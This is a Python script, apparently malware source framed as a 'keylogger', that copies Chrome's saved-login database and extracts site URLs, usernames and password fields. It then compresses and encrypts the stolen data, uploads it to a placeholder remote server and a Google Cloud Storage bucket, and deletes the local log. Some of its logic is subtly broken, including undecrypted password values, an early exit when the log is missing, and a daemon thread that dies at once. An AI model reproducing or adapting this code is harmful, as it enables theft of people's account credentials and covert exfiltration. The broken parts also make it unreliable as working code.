import os
import time
import sqlite3
import shutil
import requests
import logging
import threading
import hashlib
from datetime import datetime
from cryptography.fernet import Fernet
import configparser
import zlib
from google.cloud import storage

# Load configurations from an external config file
config = configparser.ConfigParser()
config.read(os.path.expanduser("~/.keylogger_config.ini"))

SERVER_URL = config.get("Server", "URL", fallback="https://your-server-url.com/upload")
encryption_key = config.get("Encryption", "Key", fallback=Fernet.generate_key().decode()).encode()

GCS_BUCKET_NAME = config.get("GoogleCloud", "BucketName", fallback="your_bucket_name")
GCS_KEY_FILE = config.get("GoogleCloud", "KeyFile", fallback="path/to/your/service-account-key.json")

# Log file details
log_dir = os.path.expanduser("~/.keylogger_logs")
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

# Internal logging for debugging
internal_log = os.path.join(log_dir, "internal_log.txt")
logging.basicConfig(filename=internal_log, level=logging.DEBUG, format='%(asctime)s - %(message)s')

cipher_suite = Fernet(encryption_key)

# Function to retrieve Chrome passwords
def get_chrome_passwords():
    try:
        chrome_data_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
        temp_db = os.path.join(log_dir, "temp_db")

        shutil.copy2(chrome_data_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()

        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        logins = cursor.fetchall()

        with open(log_file, "a") as file:
            for login in logins:
                file.write(f"{datetime.now()} - URL: {login[0]}, Username: {login[1]}, Password: {login[2]}\n")

        conn.close()
        os.remove(temp_db)
    except Exception as e:
        logging.error(f"Failed to retrieve Chrome passwords: {e}")

# Function to compress logs
def compress_logs():
    try:
        with open(log_file, "rb") as file:
            compressed_data = zlib.compress(file.read())
        with open(log_file, "wb") as file:
            file.write(compressed_data)
    except Exception as e:
        logging.error(f"Failed to compress logs: {e}")

# Function to encrypt logs
def encrypt_logs():
    try:
        with open(log_file, "rb") as file:
            encrypted_data = cipher_suite.encrypt(file.read())
        with open(log_file, "wb") as file:
            file.write(encrypted_data)
    except Exception as e:
        logging.error(f"Failed to encrypt logs: {e}")

# Function to verify log file integrity
def verify_log_integrity():
    try:
        with open(log_file, "rb") as file:
            data = file.read()
        checksum = hashlib.sha256(data).hexdigest()
        logging.info(f"Log file checksum: {checksum}")
        return checksum
    except Exception as e:
        logging.error(f"Failed to verify log integrity: {e}")
        return None

# Function to send logs to a server
def send_logs_to_server():
    retries = 3
    for attempt in range(retries):
        try:
            with open(log_file, "rb") as file:
                files = {"file": ("keylog.txt", file)}
                response = requests.post(SERVER_URL, files=files)

            if response.status_code == 200:
                logging.info("Logs sent to server successfully.")
                break
            else:
                logging.warning(f"Failed to send logs: {response.status_code}, {response.text}")
        except Exception as e:
            logging.error(f"Error in sending logs to server: {e}")
        time.sleep(5)
    else:
        logging.error("Failed to send logs after multiple attempts.")

# Function to send logs to Google Cloud Storage
def send_logs_to_gcs():
    try:
        # Initialize the Google Cloud Storage client
        client = storage.Client.from_service_account_json(GCS_KEY_FILE)
        bucket = client.bucket(GCS_BUCKET_NAME)
        blob = bucket.blob(os.path.basename(log_file))

        # Upload the log file
        blob.upload_from_filename(log_file)

        logging.info("Logs uploaded to Google Cloud Storage successfully.")
    except FileNotFoundError:
        logging.error("Log file not found for GCS upload.")
    except Exception as e:
        logging.error(f"Error uploading logs to GCS: {e}")

# Function to rotate internal logs
def rotate_internal_logs():
    try:
        if os.path.exists(internal_log) and os.path.getsize(internal_log) > 1024 * 1024:  # 1MB
            rotated_log = internal_log + ".1"
            if os.path.exists(rotated_log):
                os.remove(rotated_log)
            os.rename(internal_log, rotated_log)
    except Exception as e:
        logging.error(f"Failed to rotate internal logs: {e}")

# Function to run the script in the background
def run_in_background():
    try:
        if not os.path.isfile(log_file):
            logging.error("Log file does not exist.")
            return

        rotate_internal_logs()

        get_chrome_passwords()

        compress_logs()
        encrypt_logs()
        verify_log_integrity()
        send_logs_to_server()
        send_logs_to_gcs()

        os.remove(log_file)
    except Exception as e:
        logging.error(f"Background execution failed: {e}")

# Entry point
if __name__ == "__main__":
    threading.Thread(target=run_in_background, daemon=True).start()
